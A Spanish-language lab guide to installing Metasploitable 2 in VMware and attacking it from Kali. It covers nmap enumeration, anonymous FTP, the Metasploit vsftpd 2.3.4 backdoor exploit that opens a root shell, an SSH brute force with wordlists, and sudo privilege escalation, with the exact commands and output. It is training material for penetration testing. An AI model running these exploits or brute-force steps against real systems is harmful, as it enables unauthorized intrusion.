# Metasploitable 2 en VMware – Guía práctica de instalación, enumeración y explotación

## Introducción

En esta práctica se trabaja con **Metasploitable 2**, una máquina virtual deliberadamente vulnerable diseñada para el aprendizaje de seguridad ofensiva y pruebas de penetración en entornos controlados. El objetivo es desplegar la máquina en **VMware**, verificar la conectividad de red y realizar un proceso completo de **enumeración, explotación y post-explotación** utilizando herramientas habituales como **Nmap** y **Metasploit Framework**.

A lo largo del laboratorio se cubren los siguientes puntos:

- Descarga e importación de Metasploitable 2 en VMware.
- Identificación de la dirección IP y verificación de conectividad desde Kali Linux.
- Enumeración completa de puertos y servicios con Nmap.
- Identificación de configuraciones inseguras (FTP anónimo).
- Explotación de una vulnerabilidad conocida en **vsftpd 2.3.4**.
- Obtención de acceso remoto mediante reverse shell.
- Ataque de fuerza bruta contra el servicio SSH usando diccionarios.
- Acceso al sistema mediante credenciales débiles.
- Escalada de privilegios mediante una mala configuración de `sudo`.

Esta guía está pensada **exclusivamente para entornos de laboratorio y aprendizaje**. Metasploitable 2 es intencionadamente insegura y no debe exponerse nunca a redes reales o no controladas.

## 1. Descarga de Metasploitable 2

El primer paso es obtener Metasploitable 2 desde la página oficial de Rapid7:

https://www.rapid7.com/products/metasploit/metasploitable/

En esa página, se pulsa el botón **Download** para descargar la máquina virtual.

El archivo descargado es un **.zip**, que contiene los ficheros de la máquina virtual.

## 2. Extracción de los archivos

Una vez descargado el archivo ZIP:

1. Se descomprime en el equipo local.
2. Tras la extracción, se obtiene una carpeta que contiene varios archivos, entre ellos:
   - `Metasploitable.vmx` (archivo de configuración de la máquina virtual)
   - `Metasploitable.vmdk` (disco virtual)

Esta carpeta será la que se utilice para importar la máquina en VMware.

## 3. Importar Metasploitable en VMware

1. Abrir **VMware**.
2. En el menú superior, ir a: **Archivo > Abrir**
3. Navegar hasta la carpeta donde se extrajo Metasploitable.
4. Seleccionar el archivo `Metasploitable.vmx`.
5. Pulsar en **Abrir**.

VMware cargará la configuración de la máquina virtual y la máquina quedará lista para usarse.

## 4. Primer arranque y acceso al sistema

Durante el arranque, Metasploitable 2 muestra un aviso indicando que la máquina **no debe exponerse a redes no confiables**.

Tras finalizar el inicio, aparece la pantalla de login.

Credenciales por defecto:
- Usuario: `msfadmin`
- Contraseña: `msfadmin`

![Pantalla de login de Metasploitable](images/01-login-screen.png)

Introduciendo estas credenciales se accede correctamente al sistema.

![Sesión iniciada correctamente](images/02-successful-login.png)

Una vez dentro, se muestra un prompt bajo el usuario `msfadmin`, confirmando que la máquina funciona correctamente.

## 5. Comprobación de la dirección IP y conectividad

Una vez iniciada sesión en Metasploitable 2, el siguiente paso es identificar la **dirección IP** que le ha sido asignada a la máquina virtual, ya que será necesaria para trabajar con ella desde la máquina atacante (por ejemplo, Kali Linux).

### 5.1 Obtener la IP desde Metasploitable

Dentro de Metasploitable:

```bash
ifconfig
```

En la interfaz de red `eth0` se puede ver la dirección IP asignada.  
En este caso, la máquina Metasploitable ha recibido la siguiente IP:

```text
192.168.184.130
```

### 5.2 Comprobar conectividad desde Kali Linux

Desde la máquina Kali Linux, se comprueba si hay visibilidad de red hacia Metasploitable usando ping:

```bash
ping 192.168.184.130
```

La respuesta correcta confirma que:

- Ambas máquinas están en la misma red de laboratorio
- Existe conectividad entre Kali y Metasploitable
- El entorno está listo para comenzar las pruebas

### 5.3 Descubrir la IP si no se conoce (netdiscover)

En caso de no conocer la IP de Metasploitable, se puede descubrir utilizando una herramienta de descubrimiento de hosts en red, como `netdiscover`.

Desde Kali Linux:

```bash
sudo netdiscover
```

Esta herramienta envía peticiones ARP en la red local y muestra los hosts activos.  
En la salida se puede identificar la máquina Metasploitable por:

- Su dirección IP
- Su dirección MAC
- El fabricante (por ejemplo, VMware, Inc.)

De esta forma, incluso sin acceso directo a la consola de Metasploitable, es posible localizar su dirección IP dentro del laboratorio.

## 6. Enumeración de servicios con Nmap

Una vez confirmada la conectividad con la máquina Metasploitable, el siguiente paso es realizar un **escaneo completo de puertos y servicios** para identificar qué servicios están expuestos y qué versiones se están ejecutando.

Para ello se utiliza el siguiente comando:

```bash
nmap -p- -sCV -n -Pn -vvv -T5 192.168.184.130 -oN fullscan
```

### 6.1 Explicación del comando

- `-p-`: Escanea todos los puertos TCP (1–65535).
- `-sC`: Ejecuta los scripts por defecto de Nmap (detección de configuraciones inseguras y vulnerabilidades comunes).
- `-sV`: Intenta detectar versiones de los servicios.
- `-n`: No realiza resolución DNS (más rápido).
- `-Pn`: No hace descubrimiento de host (asume que el host está activo).
- `-vvv`: Modo muy verboso (más detalle en la salida).
- `-T5`: Plantilla de tiempo agresiva (más rápido, para entornos controlados de laboratorio).
- `-oN fullscan`: Guarda el resultado en un archivo llamado `fullscan`.

Este tipo de comando es típico en entornos de laboratorio o pruebas controladas, ya que es un escaneo agresivo que busca obtener la máxima información posible del objetivo.

### 6.2 Revisión de resultados

Una vez finalizado el escaneo, se revisa el contenido del archivo generado:

```bash
cat fullscan
```

Para mantener el trabajo organizado, se crea un directorio y se mueve el archivo de resultados:

```bash
mkdir metasploitable
mv fullscan metasploitable/
cd metasploitable
ls
```

De esta forma, los resultados del escaneo quedan almacenados y organizados para su posterior análisis.

### 6.3 Primer servicio identificado: FTP (puerto 21)

El primer puerto relevante que reporta Nmap es:

- Puerto: `21/tcp`
- Servicio: `FTP`
- Versión: `vsftpd 2.3.4`

Además, los scripts de Nmap indican lo siguiente:

```text
ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

Esto significa que el servidor FTP permite acceso anónimo sin credenciales, lo cual es una configuración insegura.

### 6.4 Comprobación de acceso FTP anónimo

Para verificarlo, se intenta conexión desde Kali:

```bash
ftp Anonymous@192.168.184.130
```

Cuando el servidor solicita la contraseña, simplemente se pulsa **Enter** sin introducir ninguna.

Resultado:

```text
230 Login successful.
```

Esto confirma que:

- El servidor permite acceso FTP sin autenticación.
- Cualquier usuario puede listar, descargar (y en algunos casos subir) archivos.
- Si existieran ficheros sensibles, podrían ser accedidos sin ningún tipo de control.

Este es un ejemplo claro de vulnerabilidad de configuración identificada gracias a la enumeración automática con Nmap y verificada manualmente.

## 7. Explotación del servicio FTP vulnerable (vsftpd 2.3.4)

Durante la fase de enumeración se identificó que el puerto **21/tcp** estaba abierto y que el servicio era **vsftpd 2.3.4**.  
Esta versión es conocida por contener una **puerta trasera (backdoor)** que permite ejecución de comandos remotos.

### 7.1 Búsqueda de exploits con searchsploit

```bash
searchsploit vsftpd 2.3.4
```

El resultado muestra, entre otros, exploits conocidos (incluyendo uno para Metasploit), lo que confirma que existe una vulnerabilidad explotable para este servicio.

### 7.2 Uso de Metasploit Framework

Se inicia Metasploit:

```bash
msfconsole
```

Se busca el módulo:

```text
search vsftpd 2.3.4
```

Se utiliza el exploit:

```text
use exploit/unix/ftp/vsftpd_234_backdoor
```

### 7.3 Configuración del exploit

Se revisan las opciones necesarias:

```text
show options
```

Parámetros importantes:

- `RHOSTS`: IP de la víctima (Metasploitable)
- `RPORT`: Puerto del servicio FTP (21)
- `CHOST`: IP de la máquina atacante (Kali)
- `CPORT`: Puerto local para recibir la conexión

Primero se obtiene la IP de Kali con:

```bash
ifconfig
```

En este caso, la IP del atacante es:

```text
192.168.184.128
```

Se configuran las opciones:

```text
set CHOST 192.168.184.128
set CPORT 9090
set RHOSTS 192.168.184.130
```

### 7.4 Ejecución del exploit

Una vez configurado todo, se lanza el exploit con:

```text
run
```

Ejemplo de salida relevante:

```text
[+] 192.168.184.130:21 - Backdoor service has been spawned, handling...
[+] 192.168.184.130:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session opened
```

### 7.5 Impacto de la vulnerabilidad

Esta vulnerabilidad permite a un atacante ejecutar comandos remotamente y comprometer totalmente la máquina (RCE crítico).

## 8. Acceso a la máquina víctima tras la explotación

Tras ejecutar el exploit, Metasploit muestra un mensaje similar a:

```text
Command shell session 1 opened (192.168.184.128:9090 -> 192.168.184.130:6200)
```

Esto indica que la víctima ha iniciado una conexión de vuelta hacia el atacante y Metasploit nos proporciona una shell interactiva.

### 8.1 Verificación de que estamos dentro de la víctima

Para confirmarlo:

```bash
ifconfig
```

En la salida se observa la IP de la víctima:

```text
inet addr: 192.168.184.130
```

## 9. Ataque de fuerza bruta contra SSH usando Metasploit

Tras revisar `fullscan`, se identifica el servicio SSH:

```text
22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1
```

### 9.1 Preparación de diccionarios

Archivo `users`:

```text
admin
admin123
msfadmin
```

Archivo `passwords`:

```text
pass
password
msfadmin
```

### 9.2 Selección del módulo de Metasploit

```bash
msfconsole
```

```text
search ssh_login
use auxiliary/scanner/ssh/ssh_login
```

### 9.3 Configuración del módulo

Opciones relevantes:

- `RHOSTS`
- `RPORT`
- `USER_FILE`
- `PASS_FILE`
- `STOP_ON_SUCCESS`

Ejemplo de configuración:

```text
set RHOSTS 192.168.184.130
set RPORT 22
set USER_FILE users
set PASS_FILE passwords
set STOP_ON_SUCCESS true
```

### 9.4 Ejecución del ataque

```text
run
```

Si una combinación es válida, el módulo lo indicará y puede abrir una sesión automáticamente.

## 10. Compromiso del servicio SSH mediante credenciales válidas

En este caso, se encuentra una credencial válida:

```text
Success: 'msfadmin:msfadmin'
SSH session 1 opened (192.168.184.128 -> 192.168.184.130:22)
```

### 10.1 Gestión de sesiones

Listar sesiones:

```text
sessions
```

Interactuar con la sesión 1:

```text
sessions 1
```

Verificación:

```bash
whoami
```

```text
msfadmin
```

## 11. Escalada de privilegios mediante sudo

Aunque el acceso por SSH corresponde al usuario `msfadmin`, se comprueba si tiene permisos especiales:

```bash
sudo -l
```

Salida:

```text
User msfadmin may run the following commands on this host:
    (ALL) ALL
```

### 11.1 Obtención de shell como root

Dado que puede ejecutar cualquier comando con sudo:

```bash
sudo su
whoami
```

Salida:

```text
root
```

### 11.2 Impacto

- Cualquier atacante que comprometa `msfadmin` puede obtener acceso root inmediato.
- No existe separación de privilegios real.
- El sistema queda completamente comprometido.

En un entorno real, esto debería corregirse limitando estrictamente qué usuarios pueden usar `sudo` y qué comandos pueden ejecutar, aplicando el principio de mínimos privilegios.
